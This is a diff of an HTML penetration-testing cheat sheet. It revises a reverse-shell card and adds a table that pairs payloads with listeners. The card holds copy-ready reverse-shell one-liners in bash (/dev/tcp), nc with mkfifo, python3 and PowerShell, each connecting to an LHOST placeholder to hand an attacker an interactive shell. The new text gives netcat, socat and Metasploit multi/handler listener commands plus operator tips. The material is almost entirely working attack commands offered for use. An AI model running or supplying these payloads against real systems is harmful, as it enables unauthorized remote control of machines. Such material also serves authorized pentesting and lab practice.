@@ -463,15 +463,32 @@ nc TARGET 8080                    <span class="cm"># attacker</span></code><butt
       </div>
 
       <div class="card"><h3>Reverse shell payloads <span class="tag">connect back</span></h3>
-        <span class="lbl">bash</span>
+        <span class="lbl">① listener — start on attacker FIRST, then fire a payload</span>
+        <div class="cmd"><code>nc -lvnp 4444                     <span class="cm"># catches every payload below</span></code><button class="copy">⧉</button></div>
+        <span class="lbl">② bash — on target</span>
         <div class="cmd"><code>bash -i &gt;&amp; /dev/tcp/LHOST/4444 0&gt;&amp;1</code><button class="copy">⧉</button></div>
-        <span class="lbl">nc mkfifo</span>
+        <span class="lbl">② nc mkfifo — on target (no <code class="inl">-e</code>)</span>
         <div class="cmd"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc LHOST 4444 &gt;/tmp/f</code><button class="copy">⧉</button></div>
-        <span class="lbl">python3</span>
+        <span class="lbl">② python3 — on target</span>
         <div class="cmd"><code>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'</code><button class="copy">⧉</button></div>
-        <span class="lbl">powershell (windows)</span>
+        <span class="lbl">② powershell — on target (windows)</span>
         <div class="cmd"><code>powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2&gt;&amp;1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($sb),0,$sb.Length)}"</code><button class="copy">⧉</button></div>
-        <p class="note">Also: <code class="inl">php</code>, <code class="inl">perl</code>, <code class="inl">socat</code>. Grab payloads from revshells.com.</p>
+        <p class="note">All four are <b>plain TCP</b> → the same <code class="inl">nc -lvnp 4444</code> catches any of them. Match <code class="inl">LHOST</code>/port to your listener. More at revshells.com.</p>
+      </div>
+
+      <div class="card"><h3>Listener ↔ payload <span class="tag">pairing</span></h3>
+        <p class="note">The listener must speak the <b>same transport</b> as the payload. Start the listener first, then run the matching payload on the target.</p>
+        <div style="overflow-x:auto;margin-top:8px;"><table>
+          <thead><tr><th>Payload on target</th><th>Listener on attacker</th></tr></thead>
+          <tbody>
+            <tr><td>bash · nc · python · powershell <span class="mono">(plain TCP)</span></td><td><span class="mono">nc -lvnp 4444</span></td></tr>
+            <tr><td><span class="mono">socat … EXEC:"bash -li"</span></td><td><span class="mono">socat TCP-L:443 -</span></td></tr>
+            <tr><td><span class="mono">socat OPENSSL: … EXEC</span></td><td><span class="mono">socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -</span></td></tr>
+            <tr><td><span class="mono">msfvenom …shell_reverse_tcp</span></td><td><span class="mono">nc -lvnp</span> or <span class="mono">multi/handler</span></td></tr>
+            <tr><td><span class="mono">msfvenom …meterpreter/*</span></td><td><span class="mono">multi/handler</span> (same PAYLOAD)</td></tr>
+          </tbody>
+        </table></div>
+        <p class="note">Gotcha: <b>meterpreter</b> payloads only connect back to <code class="inl">multi/handler</code> with the <b>exact same</b> <code class="inl">PAYLOAD</code>/<code class="inl">LPORT</code> set — a plain <code class="inl">nc</code> will catch the connection but the session dies.</p>
       </div>
 
       <div class="card"><h3>Stabilize the shell <span class="tag">tty</span></h3>
